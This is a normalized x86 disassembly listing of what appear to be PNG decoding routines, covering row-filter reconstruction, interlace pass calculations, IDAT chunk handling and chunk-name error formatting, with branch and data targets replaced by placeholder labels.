jb r-xdata
mov ecx 0x7
sub ecx esi
mov edx 0x7f7f
sar edx cl
mov bl al
mov ecx esi
shl bl cl
and dl [ edi ]
or dl bl
mov [ edi ] dl
cmp esi [ esp + 0x1c ]
jne r-xdata
mov edx [ esp + 0x24 ]
sub [ esp + 0x28 ] 0x1
jne r-xdata
add edx [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
dec [ esp + 0x18 ]
jmp r-xdata
mov ecx 0x6
sub ecx esi
mov ebx 0x3f3f
sar ebx cl
mov ecx esi
shl al cl
and bl [ edi ]
or bl al
mov [ edi ] bl
cmp esi ebp
jne r-xdata
cmp edx ebp
jne r-xdata
mov [ esp + 0x14 ] ecx
jmp r-xdata
jmp r-xdata
push esi
lea ecx [ esp + 0x54 ]
push ecx
push edi
call sub_443790
add esp 0xc
sub edi esi
sub ebp 0x1
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x2c ]
inc eax
mov [ esp + 0x14 ] eax
cmp eax [ ecx ]
jb r-xdata
add esi [ esp + 0x20 ]
mov esi [ esp + 0x1c ]
dec edi
jmp r-xdata
add edx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
dec [ esp + 0x18 ]
jmp r-xdata
mov ecx 0x4
sub ecx esi
mov ebx 0xf0f
sar ebx cl
mov ecx esi
shl al cl
and bl [ edi ]
or bl al
mov [ edi ] bl
cmp esi ebp
jne r-xdata
mov ebp [ esp + 0x24 ]
mov al [ esp + 0x13 ]
sub [ esp + 0x28 ] 0x1
jne r-xdata
mov eax [ esp + 0x18 ]
mov al [ eax ]
mov cl dl
shr al cl
mov ecx [ esp + 0x30 ]
and al 0xf
mov [ esp + 0x13 ] al
test ecx ecx
jle r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x2c ]
inc eax
mov [ esp + 0x28 ] eax
cmp eax [ ecx ]
jb r-xdata
add esi [ esp + 0x1c ]
mov esi [ esp + 0x20 ]
dec edi
jmp r-xdata
mov al [ esp + 0x13 ]
sub [ esp + 0x14 ] 0x1
jne r-xdata
sub_43ac00
sub esp 0x14
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x2c ]
mov esi ecx
cmp eax 0x4
ja r-xdata
mov esi [ esp + 0x28 ]
mov ecx r--data
call sub_43b800
mov [ edi ] 0x0
jmp [ eax * 4 + jump_table_43ad90 ]
movzx eax [ edx + 0xb ]
mov esi [ edx + 0x4 ]
add eax 0x7
sar eax 0x3
lea ecx [ eax + edi ]
cmp eax esi
jae r-xdata
mov edx [ edx + 0x4 ]
xor eax eax
test edx edx
jbe r-xdata
movzx eax [ edx + 0xb ]
mov edx [ edx + 0x4 ]
add eax 0x7
sar eax 0x3
sub edx eax
mov ecx edi
test eax eax
jbe r-xdata
movzx eax [ edx + 0xb ]
mov edx [ edx + 0x4 ]
add eax 0x7
sar eax 0x3
sub edx eax
mov [ esp + 0x10 ] edi
mov ebx esi
test eax eax
jbe r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov edx ecx
sub edx eax
sub esi eax
jmp r-xdata
mov cl [ eax + esi ]
add [ edi ] cl
inc eax
inc edi
cmp eax edx
jb r-xdata
test edx edx
jbe r-xdata
mov ebp eax
lea ebx [ ebx ]
test edx edx
jbe r-xdata
mov ebp eax
mov al [ edx ]
add [ ecx ] al
inc ecx
inc edx
sub esi 0x1
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov ebx edx
mov al [ esi ]
shr al 0x1
add [ ecx ] al
inc esi
inc ecx
sub ebp 0x1
jne r-xdata
mov [ esp + 0x18 ] edx
jmp r-xdata
mov al [ ebx ]
mov esi [ esp + 0x10 ]
add [ esi ] al
inc [ esp + 0x10 ]
inc ebx
sub ebp 0x1
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
movzx edx [ esi ]
movzx eax [ edi ]
add eax edx
cdq
sub eax edx
sar eax 0x1
add [ ecx ] al
inc edi
inc esi
inc ecx
sub ebx 0x1
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
movzx edx [ ecx ]
movzx esi [ ebx ]
movzx ebp [ edi ]
inc ecx
mov [ esp + 0x20 ] ecx
mov eax esi
mov ecx ebp
inc edi
sub eax edx
inc ebx
sub ecx edx
mov [ esp + 0x1c ] edi
test eax eax
jge r-xdata
mov [ esp + 0x14 ] eax
mov edi eax
neg edi
mov [ esp + 0x14 ] edi
jmp r-xdata
add eax ecx
jns r-xdata
neg edi
mov edi ecx
test ecx ecx
jge r-xdata
mov ecx [ esp + 0x14 ]
cmp ecx edi
jg r-xdata
neg eax
cmp edi eax
jg r-xdata
cmp ecx eax
jg r-xdata
mov eax [ esp + 0x10 ]
add [ eax ] dl
inc eax
sub [ esp + 0x18 ] 0x1
mov [ esp + 0x10 ] eax
jne r-xdata
mov edx esi
mov edx ebp
jmp r-xdata
mov edi [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
sub_43adb0
sub esp 0x84
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x80 ] eax
push ebp
mov eax 0x2
push esi
xor edx edx
mov esi ecx
push edi
mov edi 0x1
add [ esi + 0xe4 ] edi
mov ecx 0x4
mov ebp 0x8
mov [ esp + 0x3c ] eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x78 ] eax
mov [ esp + 0x60 ] eax
mov [ esp + 0x64 ] eax
mov eax [ esi + 0xe4 ]
mov [ esp + 0x30 ] edx
mov [ esp + 0x34 ] ecx
mov [ esp + 0x38 ] edx
mov [ esp + 0x40 ] edx
mov [ esp + 0x44 ] edi
mov [ esp + 0x48 ] edx
mov [ esp + 0x14 ] ebp
mov [ esp + 0x18 ] ebp
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] ecx
mov [ esp + 0x2c ] edi
mov [ esp + 0x68 ] edx
mov [ esp + 0x6c ] edx
mov [ esp + 0x70 ] ecx
mov [ esp + 0x74 ] edx
mov [ esp + 0x7c ] edx
mov [ esp + 0x80 ] edi
mov [ esp + 0x4c ] ebp
mov [ esp + 0x50 ] ebp
mov [ esp + 0x54 ] ebp
mov [ esp + 0x58 ] ecx
mov [ esp + 0x5c ] ecx
cmp eax [ esi + 0xd0 ]
jb r-xdata
mov ecx [ esp + 0x8c ]
pop edi
pop esi
pop ebp
xor ecx esp
call sub_43f96b
add esp 0x84
retn
push ebx
cmp [ esi + 0x123 ] dl
je r-xdata
test [ esi + 0x6c ] 0x20
jne r-xdata
mov eax [ esi + 0xd8 ]
mov ecx [ esi + 0xe8 ]
add eax edi
push eax
push edx
push ecx
mov [ esi + 0xe4 ] edx
call sub_443360
add esp 0xc
jmp r-xdata
cmp [ esi + 0x10c ] 0x0
jne r-xdata
lea eax [ esp + 0x13 ]
mov [ esp + 0x88 ] 0x49
mov [ esp + 0x89 ] 0x44
mov [ esp + 0x8a ] 0x41
mov [ esp + 0x8b ] 0x54
mov [ esi + 0x80 ] eax
mov [ esi + 0x84 ] 0x1
inc [ esi + 0x124 ]
mov bl [ esi + 0x124 ]
cmp bl 0x7
jae r-xdata
mov ecx r--data
call sub_43b800
cmp [ esi + 0x78 ] 0x0
je r-xdata
lea eax [ esi + 0x74 ]
push eax
call sub_43cd30
add esp 0x4
cmp eax 0x1
je r-xdata
cmp [ esi + 0x10c ] 0x0
jne r-xdata
mov eax [ esi + 0xc8 ]
movzx ecx bl
add ecx ecx
add ecx ecx
sub eax [ esp + ecx + 0x34 ]
mov edi [ esp + ecx + 0x18 ]
lea eax [ eax + edi - 0x1 ]
xor edx edx
div edi
mov edi eax
mov al [ esi + 0x129 ]
cmp al 0x8
mov [ esi + 0xe0 ] edi
movzx eax al
jb r-xdata
lea edx [ esi + 0x74 ]
call sub_43cb70
or [ esi + 0x68 ] ebp
cmp [ esi + 0x84 ] 0x0
je r-xdata
test eax eax
je r-xdata
mov eax [ esi + 0xb0 ]
mov ecx [ esi + 0x10c ]
mov edi [ esi + 0xac ]
mov [ esi + 0x78 ] eax
mov [ esi + 0x74 ] edi
cmp eax ecx
jbe r-xdata
lea ebx [ esi + 0x11c ]
imul eax edi
add eax 0x7
shr eax 0x3
shr eax 0x3
imul eax edi
jmp r-xdata
mov ecx r--data
jmp r-xdata
cmp [ esi + 0x78 ] 0x0
jne r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
mov eax [ esi + 0x8c ]
test eax eax
jne r-xdata
mov ebx [ esi + 0x78 ]
call sub_437670
mov ecx [ esi + 0x78 ]
sub [ esi + 0x10c ] ecx
mov ebp 0x8
mov [ esi + 0x78 ] ecx
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
push 0x4
lea ecx [ esp + 0x18 ]
push ecx
push esi
call eax
add esp 0xc
jmp r-xdata
cmp bl 0x7
jb r-xdata
mov edx [ esi + 0xcc ]
sub edx [ esp + ecx + 0x6c ]
mov ebp [ esp + ecx + 0x50 ]
lea eax [ edx + ebp - 0x1 ]
xor edx edx
div ebp
mov ebp 0x8
mov [ esi + 0xd0 ] eax
test edi edi
je r-xdata
inc eax
test [ esi + 0x70 ] 0x2
mov [ esi + 0xdc ] eax
jne r-xdata
call sub_43b800
cmp [ esi + 0x10c ] 0x0
je r-xdata
cmp [ esi + 0x78 ] 0x0
jne r-xdata
mov ecx r--data
push esi
mov ecx eax
call sub_43b740
add esp 0x4
mov eax r--data
mov eax [ esi + 0x50 ]
mov [ esi + 0x10c ] edi
mov [ esi + 0x110 ] 0x0
test eax eax
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov eax [ esp + 0x14 ]
movzx ecx [ esp + 0x17 ]
movzx edi al
shl edi 0x8
movzx edx ah
movzx eax [ esp + 0x16 ]
add edi edx
shl edi 0x8
add edi eax
shl edi 0x8
add edi ecx
cmp edi 0x7fffffff
jbe r-xdata
pop ebx
or [ esi + 0x68 ] ebp
or [ esi + 0x6c ] 0x20
mov [ esi + 0x84 ] 0x0
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
push 0x4
push ebx
push esi
call eax
add esp 0xc
jmp r-xdata
test [ esi + 0x6c ] 0x800
jne r-xdata
mov edx [ esi + 0x6c ]
and edx 0x300
cmp edx 0x300
jne r-xdata
test [ ebx ] 0x20
je r-xdata
mov eax [ esp + 0x88 ]
cmp [ ebx ] eax
je r-xdata
mov eax [ esi + 0x110 ]
test ebx ebx
jne r-xdata
jmp r-xdata
cmp [ esi + 0x10c ] 0x0
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov edx 0x4
mov ecx ebx
call sub_43e220
xor eax eax
jmp r-xdata
push 0x0
mov ecx esi
call sub_4376e0
mov eax [ esi + 0x50 ]
add esp 0x4
test eax eax
je r-xdata
mov [ esi + 0x110 ] eax
sub_43b180
sub esp 0x38
push ebx
xor edx edx
mov eax 0x4
push ebp
mov ecx 0x2
push edi
mov [ esp + 0x2c ] eax
mov edi 0x1
mov ebx 0x8
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
mov eax esi
mov [ esp + 0x28 ] edx
mov [ esp + 0x30 ] edx
mov [ esp + 0x34 ] ecx
mov [ esp + 0x38 ] edx
mov [ esp + 0x3c ] edi
mov [ esp + 0x40 ] edx
mov [ esp + 0xc ] ebx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] edi
mov [ esi + 0x78 ] edx
call sub_432180
cmp [ esi + 0x123 ] 0x0
je r-xdata
mov eax [ esi + 0xcc ]
mov ebp [ esi + 0xc8 ]
mov ecx [ esi + 0xd8 ]
mov [ esi + 0xd0 ] eax
mov [ esi + 0xe0 ] ebp
add ecx edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov edi ebx
and edi 0x1000
je r-xdata
cmp [ esi + 0x127 ] 0x8
jae r-xdata
mov ecx [ esi + 0xcc ]
mov [ esi + 0xd0 ] ecx
mov eax [ esi + 0xcc ]
add eax 0x7
shr eax 0x3
mov [ esi + 0xd0 ] eax
jmp r-xdata
mov edx ebx
and edx 0x8000
je r-xdata
mov cl [ esi + 0x126 ]
cmp cl 0x3
jne r-xdata
mov eax 0x8
imul ecx eax
add ecx 0x7
shr ecx 0x3
inc ecx
jmp r-xdata
shr ecx 0x3
imul ecx eax
inc ecx
jmp r-xdata
movzx eax [ esi + 0x124 ]
mov ebp [ esi + 0xc8 ]
add eax eax
add eax eax
mov ecx [ esp + eax + 0xc ]
mov edx ebp
sub edx [ esp + eax + 0x28 ]
lea eax [ edx + ecx - 0x1 ]
xor edx edx
div ecx
mov cl [ esi + 0x129 ]
cmp cl bl
movzx ecx cl
mov [ esi + 0xe0 ] eax
jb r-xdata
test ebx 0x4000
je r-xdata
mov cl [ esi + 0x126 ]
cmp cl 0x3
jne r-xdata
test cl cl
jne r-xdata
xor eax eax
cmp [ esi + 0x11a ] ax
setne al
lea eax [ eax * 8 + 0x18 ]
jmp r-xdata
mov ebx [ esi + 0x70 ]
movzx eax [ esi + 0x129 ]
mov [ esi + 0xdc ] ecx
test bl 0x4
je r-xdata
test ebx 0x100000
je r-xdata
cmp [ esi + 0x11a ] 0x0
je r-xdata
test cl cl
jne r-xdata
mov eax 0x20
jmp r-xdata
cmp cl 0x2
jne r-xdata
cmp eax 0x8
jge r-xdata
lea ecx [ ebp + 0x7 ]
and ecx 0xfffffff8
cmp eax 0x8
jl r-xdata
movzx ecx [ esi + 0x65 ]
movzx edx [ esi + 0x64 ]
imul ecx edx
cmp ecx eax
jle r-xdata
test edx edx
jne r-xdata
test edi edi
jne r-xdata
cmp cl 0x2
jne r-xdata
xor ecx ecx
cmp eax 0x8
setg cl
dec ecx
and ecx 0xfffffff0
add ecx 0x20
jmp r-xdata
cmp [ esi + 0x11a ] 0x0
je r-xdata
cmp [ esi + 0x11a ] 0x0
je r-xdata
mov eax 0x8
imul ecx eax
add ecx 0x7
shr ecx 0x3
mov edx ecx
mov edx eax
shr edx 0x3
imul edx ecx
jmp r-xdata
mov eax ecx
xor edx edx
cmp eax 0x10
setg dl
dec edx
and edx 0xffffffe0
add edx 0x40
mov eax edx
mov cl [ esi + 0x126 ]
cmp cl 0x4
je r-xdata
xor ecx ecx
cmp eax 0x20
setg cl
dec ecx
and ecx 0xffffffe0
add ecx 0x40
mov eax ecx
lea ecx [ eax * 4 ]
mov eax 0x55555556
imul ecx
mov eax edx
shr eax 0x1f
add eax edx
add eax eax
jmp r-xdata
cmp ebx 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x250 ]
test ecx ecx
je r-xdata
add eax 0x7
sar eax 0x3
lea ebx [ eax + edx + 0x1 ]
lea edi [ ebx + 0x40 ]
cmp edi [ esi + 0x280 ]
jbe r-xdata
cmp eax 0x8
jg r-xdata
lea edi [ ebx + 0x1 ]
cmp edi [ esi + 0x284 ]
jbe r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
test edi edi
je r-xdata
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
xor eax eax
cmp cl 0x6
setne al
dec eax
and eax 0x10
add eax 0x30
jmp r-xdata
xor eax eax
cmp cl 0x6
sete al
lea eax [ eax * 8 + 0x18 ]
jmp r-xdata
or [ esi + 0x6c ] 0x40
pop edi
pop ebp
mov [ esi + 0xd8 ] ebx
pop ebx
add esp 0x38
retn
mov ecx [ esi + 0xe8 ]
test ecx ecx
je r-xdata
xor eax eax
mov eax [ esi + 0x248 ]
push edi
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
mov eax [ esi + 0x250 ]
add eax 0x20
mov [ esi + 0xec ] eax
mov [ esi + 0x280 ] edi
push edi
push 0x0
push eax
call sub_443360
add esp 0xc
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
xor eax eax
mov eax [ esi + 0x248 ]
push edi
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov eax ebp
jmp r-xdata
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov ebp eax
test ebp ebp
jne r-xdata
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
cmp [ esi + 0x123 ] 0x0
mov [ esi + 0x250 ] eax
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov eax ebp
jmp r-xdata
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov ebp eax
test ebp ebp
jne r-xdata
push edi
push 0x0
push eax
mov [ esi + 0xe8 ] eax
call sub_443360
add esp 0xc
mov [ esi + 0x284 ] edi
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
sub_43b540
sub esp 0x290
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x28c ] eax
mov eax [ esp + 0x294 ]
push esi
cmp ecx 0x2
jne r-xdata
cmp ecx 0x1
jne r-xdata
mov esi 0x120
jmp r-xdata
mov ecx [ esp + 0x290 ]
pop esi
xor ecx esp
xor eax eax
call sub_43f96b
add esp 0x290
retn
mov esi 0x28c
push edi
push esi
test eax eax
je r-xdata
call sub_441c3d
add esp 0x4
mov ecx [ esp + 0x2a4 ]
lea edx [ esp + 0xc ]
push edx
mov [ esp + 0x254 ] ecx
call eax
add esp 0x8
jmp r-xdata
mov eax edi
pop edi
pop esi
mov ecx [ esp + 0x28c ]
xor ecx esp
call sub_43f96b
add esp 0x290
retn
push esi
push 0x0
push edi
call sub_443360
add esp 0xc
mov edi eax
test edi edi
je r-xdata
sub_43b5e0
sub esp 0x290
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x28c ] eax
mov eax [ esp + 0x294 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x28c ]
xor ecx esp
call sub_43f96b
add esp 0x290
retn
push eax
test ecx ecx
je r-xdata
call sub_44120e
add esp 0x4
lea eax [ esp + 0x4 ]
push eax
mov [ esp + 0x24c ] edx
call ecx
add esp 0x8
mov ecx [ esp + 0x28c ]
xor ecx esp
call sub_43f96b
add esp 0x290
retn
sub_43b650
test esi esi
je r-xdata
xor eax eax
retn
test ecx ecx
je r-xdata
mov eax [ esi + 0x248 ]
push edi
push ecx
test eax eax
je r-xdata
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov eax edi
pop edi
retn
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
sub_43b6a0
test ecx ecx
je r-xdata
retn
test edx edx
je r-xdata
mov eax [ ecx + 0x24c ]
push edx
test eax eax
je r-xdata
call sub_44120e
pop ecx
push ecx
call eax
add esp 0x8
retn
sub_43b6d0
test esi esi
jne r-xdata
push ebx
mov ebx [ esi + 0x6c ]
mov eax ebx
or eax 0x100000
mov [ esi + 0x6c ] eax
test ecx ecx
je r-xdata
xor eax eax
retn
mov [ esi + 0x6c ] ebx
xor eax eax
pop ebx
retn
mov eax [ esi + 0x248 ]
push edi
push ecx
test eax eax
je r-xdata
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov eax edi
pop edi
mov [ esi + 0x6c ] ebx
pop ebx
retn
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
sub_43b740
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
push ebp
mov ebp [ esp + 0x1c ]
push esi
mov esi ecx
test ebp ebp
je r-xdata
push esi
push ebp
call sub_43b990
mov ecx [ esp + 0x20 ]
add esp 0x8
pop esi
pop ebp
xor ecx esp
call sub_43f96b
add esp 0x14
retn
mov edx [ ebp + 0x6c ]
test edx 0xc0000
je r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
cmp [ esi ] 0x23
jne r-xdata
push esi
push ebp
call eax
add esp 0x8
test edx 0x80000
je r-xdata
mov eax 0x1
mov cl 0x20
mov [ esp + 0x8 ] 0x30
mov [ esp + 0x9 ] 0x0
test edx 0x80000
je r-xdata
cmp [ esi + eax + 0x1 ] cl
je r-xdata
add esi eax
jmp r-xdata
push edi
lea edi [ eax - 0x1 ]
xor ecx ecx
test edi edi
jle r-xdata
inc eax
add eax 0x2
cmp eax 0xf
jl r-xdata
mov [ esp + ecx + 0xb ] 0x0
pop edi
jmp r-xdata
lea eax [ esi + 0x1 ]
push edi
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_443790
add esp 0xc
mov ecx edi
cmp [ esi + eax ] cl
je r-xdata
jmp r-xdata
lea esi [ esp + 0x8 ]
sub_43b800
xor eax eax
test esi esi
je r-xdata
add eax ecx
push eax
call sub_43baf0
pop ecx
retn
test [ esi + 0x6c ] 0xc0000
je r-xdata
mov edx [ esi + 0x44 ]
test edx edx
je r-xdata
cmp [ ecx ] 0x23
jne r-xdata
add eax ecx
push eax
push esi
call edx
add esp 0x8
retn
mov eax 0x1
mov dl 0x20
jmp r-xdata
cmp [ eax + ecx ] dl
je r-xdata
cmp [ eax + ecx + 0x1 ] dl
je r-xdata
inc eax
add eax 0x2
cmp eax 0xf
jl r-xdata
jmp r-xdata
sub_43b860
push ebx
push ebp
push esi
push edi
mov edi eax
xor eax eax
mov esi ecx
xor ebp ebp
lea esp [ esp ]
mov [ eax + edi ] 0x5b
mov ebx ecx
sar ebx 0x4
and ebx 0xf
mov bl [ ebx + r--data ]
inc eax
mov [ eax + edi ] bl
and ecx 0xf
mov cl [ ecx + r--data ]
inc eax
mov [ eax + edi ] cl
inc eax
mov [ eax + edi ] 0x5d
cmp ecx 0x5a
jle r-xdata
movzx ecx [ esi + ebp + 0x11c ]
lea ebx [ ecx - 0x41 ]
inc ebp
cmp ebx 0x39
ja r-xdata
test edx edx
jne r-xdata
mov [ eax + edi ] cl
jmp r-xdata
cmp ecx 0x61
jl r-xdata
mov [ eax + edi ] 0x3a
mov [ eax + edi + 0x1 ] 0x20
inc eax
inc eax
add eax edi
mov ecx 0x10
mov esi edx
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
mov [ eax + 0x3f ] 0x0
pop ebx
retn
mov [ eax + edi ] dl
pop edi
pop esi
pop ebp
pop ebx
retn
inc eax
cmp ebp 0x4
jl r-xdata
sub_43b8f0
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x54 ] eax
test esi esi
jne r-xdata
mov edx ecx
lea eax [ esp ]
mov ecx esi
call sub_43b860
push esi
lea ecx [ esp + 0x4 ]
push esi
jmp r-xdata
call sub_43b740
mov ecx [ esp + 0x58 ]
add esp 0x4
xor ecx esp
call sub_43f96b
add esp 0x58
retn
sub_43b930
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x54 ] eax
push esi
mov esi ecx
test esi esi
jne r-xdata
mov edx r--data
lea eax [ esp + 0x4 ]
call sub_43b860
lea ecx [ esp + 0x4 ]
call sub_43b800
mov ecx [ esp + 0x58 ]
pop esi
xor ecx esp
call sub_43f96b
add esp 0x58
retn
mov ecx r--data
call sub_43b800
pop esi
mov ecx [ esp + 0x54 ]
xor ecx esp
call sub_43f96b
add esp 0x58
retn
sub_43b990
sub esp 0x28
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x2c ]
mov [ esp + 0xc ] eax
mov eax [ esp + 0x30 ]
cmp [ eax ] 0x23
push esi
jne r-xdata
push eax
push r--data
call sub_443d18
add eax 0x40
push eax
call sub_4424c8
add esp 0xc
push ebx
push ebp
lea ecx [ esp + 0x23 ]
sub ecx eax
push edi
mov [ esp + 0x10 ] ecx
lea ebx [ esp + 0x24 ]
lea edi [ esp + 0x25 ]
lea ebp [ esp + 0x26 ]
sub ebx eax
sub ebp eax
lea ecx [ esp + 0x28 ]
xor esi esi
sub edi eax
sub ecx eax
mov [ esp + 0x18 ] ebx
mov [ esp + 0x20 ] ebp
mov [ esp + 0x14 ] ecx
jmp r-xdata
mov ecx [ esp + 0x24 ]
xor ecx esp
call sub_43f96b
add esp 0x28
retn
push 0x1
push eax
call sub_456698
cmp [ eax + esi ] 0x20
mov dl [ eax + esi + 0x1 ]
lea ecx [ eax + esi ]
mov [ ebx + ecx ] dl
je r-xdata
pop edi
lea ecx [ esi - 0x2 ]
pop ebp
pop ebx
cmp ecx 0xc
ja r-xdata
mov bl [ eax + esi + 0x2 ]
mov [ edi + ecx ] bl
cmp dl 0x20
je r-xdata
push esi
push eax
push r--data
jmp r-xdata
lea edx [ eax + esi + 0x1 ]
push edx
lea eax [ esp + 0x1c ]
push eax
mov [ esp + esi + 0x1f ] 0x0
push r--data
inc esi
jmp r-xdata
mov dl [ eax + esi + 0x3 ]
mov [ ecx + ebp ] dl
cmp bl 0x20
je r-xdata
call sub_443d18
add eax 0x40
push eax
call sub_4424c8
add esp 0x10
jmp r-xdata
push r--data
call sub_443d18
add eax 0x40
push eax
call sub_4424c8
mov eax [ esp + 0x18 ]
add esp 0x8
pop esi
test eax eax
je r-xdata
add esi 0x2
jmp r-xdata
mov bl [ eax + esi + 0x4 ]
mov ebp [ esp + 0x10 ]
mov [ ecx + ebp ] bl
cmp dl 0x20
je r-xdata
add esi 0x3
jmp r-xdata
mov dl [ eax + esi + 0x5 ]
mov ebp [ esp + 0x14 ]
mov [ ecx + ebp ] dl
cmp bl 0x20
je r-xdata
add esi 0x4
add esi 0x5
cmp esi 0xf
jl r-xdata
mov ebp [ esp + 0x20 ]
mov ebx [ esp + 0x18 ]
jmp r-xdata
sub_43baf0
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x28 ]
cmp [ eax ] 0x23
jne r-xdata
push eax
push r--data
call sub_443d18
add eax 0x40
push eax
call sub_4424c8
add esp 0xc
push r--data
call sub_443d18
add eax 0x40
push eax
call sub_4424c8
mov ecx [ esp + 0x28 ]
add esp 0x8
xor ecx esp
call sub_43f96b
add esp 0x24
retn
push ebx
push ebp
push esi
lea ecx [ esp + 0x1f ]
sub ecx eax
push edi
mov [ esp + 0x10 ] ecx
lea ebx [ esp + 0x20 ]
lea edi [ esp + 0x21 ]
lea ebp [ esp + 0x22 ]
sub ebx eax
sub ebp eax
lea ecx [ esp + 0x24 ]
xor esi esi
sub edi eax
sub ecx eax
mov [ esp + 0x1c ] ebx
mov [ esp + 0x14 ] ebp
mov [ esp + 0x18 ] ecx
jmp r-xdata
cmp [ eax + esi ] 0x20
mov dl [ eax + esi + 0x1 ]
lea ecx [ eax + esi ]
mov [ ebx + ecx ] dl
je r-xdata
lea ecx [ esi - 0x2 ]
cmp ecx 0xc
ja r-xdata
mov bl [ eax + esi + 0x2 ]
mov [ edi + ecx ] bl
cmp dl 0x20
je r-xdata
push eax
push r--data
call sub_443d18
add eax 0x40
push eax
call sub_4424c8
add esp 0xc
jmp r-xdata
add eax esi
push eax
lea edx [ esp + 0x24 ]
push edx
push r--data
mov [ esp + esi + 0x2d ] 0x0
call sub_443d18
add eax 0x40
push eax
call sub_4424c8
add esp 0x10
inc esi
jmp r-xdata
mov dl [ eax + esi + 0x3 ]
mov [ ecx + ebp ] dl
cmp bl 0x20
je r-xdata
push r--data
call sub_443d18
add eax 0x40
push eax
call sub_4424c8
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_43f96b
add esp 0x24
retn
add esi 0x2
jmp r-xdata
mov bl [ eax + esi + 0x4 ]
mov ebp [ esp + 0x10 ]
mov [ ecx + ebp ] bl
cmp dl 0x20
je r-xdata
add esi 0x3
jmp r-xdata
mov dl [ eax + esi + 0x5 ]
mov ebp [ esp + 0x18 ]
mov [ ecx + ebp ] dl
cmp bl 0x20
je r-xdata
add esi 0x4
add esi 0x5
cmp esi 0xf
jl r-xdata
mov ebp [ esp + 0x14 ]
mov ebx [ esp + 0x1c ]
jmp r-xdata
sub_43bc60
test esi esi
je r-xdata
retn
fld [ esp + 0x4 ]
fst [ esi + 0x80 ]
fld [ esp + 0xc ]
fst [ esi + 0x84 ]
fld [ esp + 0x14 ]
fst [ esi + 0x88 ]
fld [ esp + 0x1c ]
fst [ esi + 0x8c ]
fld [ esp + 0x24 ]
fst [ esi + 0x90 ]
fld [ esp + 0x2c ]
fstp [ esi + 0x94 ]
fld [ esp + 0x34 ]
fstp [ esi + 0x98 ]
fld [ esp + 0x3c ]
fstp [ esi + 0x9c ]
fld [ r--data ]
fmul st5
fld [ r--data ]
fadd st6
fxch st6
call sub_4567a0
fmul st4
fxch st4
mov [ esi + 0x100 ] eax
fadd st5
call sub_4567a0
fxch st2
fmul st3
mov [ esi + 0x104 ] eax
fadd st4
call sub_4567a0
fmul st2
mov [ esi + 0x108 ] eax
fadd st3
call sub_4567a0
fmul st1
mov [ esi + 0x10c ] eax
fadd st2
call sub_4567a0
fld [ esp + 0x2c ]
fmul st1
mov [ esi + 0x110 ] eax
fadd st2
call sub_4567a0
fld [ esp + 0x34 ]
fmul st1
mov [ esi + 0x114 ] eax
fadd st2
call sub_4567a0
fmul [ esp + 0x3c ]
mov [ esi + 0x118 ] eax
faddp st1
call sub_4567a0
or [ esi + 0x8 ] 0x4
mov [ esi + 0x11c ] eax
sub_43bd60
push ebx
mov ebx [ esp + 0x14 ]
push ebp
mov ebp [ esp + 0x24 ]
push edi
mov edi [ esp + 0x2c ]
test eax eax
je r-xdata
pop edi
pop ebp
